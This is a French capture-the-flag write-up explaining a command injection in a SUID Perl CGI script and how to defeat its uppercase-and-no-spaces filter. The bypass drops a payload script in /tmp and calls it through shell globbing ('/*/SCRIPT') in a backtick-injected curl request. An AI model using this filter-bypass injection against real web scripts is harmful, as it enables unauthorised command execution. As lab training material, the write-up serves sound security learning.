# Level 12

## Objectif

Exploiter une **Injection de Commande** dans un script CGI en Perl, en contournant les mécanismes de filtrage et de nettoyage des entrées (mise en majuscules et suppression des espaces).

## La Faille

À la racine se trouve un script Perl `level12.pl` (avec le bit SUID) configuré pour être exécuté par un serveur web local sur le port `4646`.

Le script récupère le paramètre d'URL `x`, lui applique deux filtres de "sécurité", puis l'injecte dans une commande système via des backticks :

```perl
	$xx =~ tr/a-z/A-Z/;    # Convertit tout en MAJUSCULES
	$xx =~ s/\s.*//;       # Supprime les espaces et tout ce qui suit
	@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

L'injection de commande est évidente (les backticks forcent le shell à exécuter le contenu de $xx), mais les filtres bloquent les attaques classiques. Par exemple, l'injection `getflag > /tmp/flag12` sera transformée en `GETFLAG>/TMP/FLAG12`, ce qui provoquera une erreur système (la commande GETFLAG n'existant pas).

# Résolution

Pour contourner ces restrictions, l'attaque se déroule en deux temps : déporter la charge utile (payload) dans un script externe, et utiliser le "globbing" (caractères jokers) du shell Linux pour l'appeler sans utiliser de minuscules ni d'espaces.

1. Préparation de la charge utile
   On crée un script bash dont le nom ne contient que des majuscules (ex: SCRIPT) dans le répertoire /tmp. Ce script contient la commande exacte à exécuter.

```Bash
	echo "getflag > /tmp/flag12" > /tmp/SCRIPT
	chmod +x /tmp/SCRIPT
```

2. Contournement du chemin (Globbing)
   Pour appeler /tmp/SCRIPT sans utiliser les lettres minuscules tmp, on utilise le joker _.
   L'expression /_/SCRIPT sera interprétée par le shell bash comme "Cherche un fichier nommé SCRIPT dans n'importe quel dossier à la racine", et il trouvera /tmp/SCRIPT.

3. Lancement de l'exploit
   On déclenche l'exécution du script via une requête curl au serveur web local, en injectant notre chemin entre backticks pour forcer son évaluation par le shell de la fonction Perl :

```Bash
	curl '127.0.0.1:4646/?x=`/*/SCRIPT`'
```

Puis on recupere le flag dans /tmp/flag12

```Bash
	cat /tmp/flag12
```
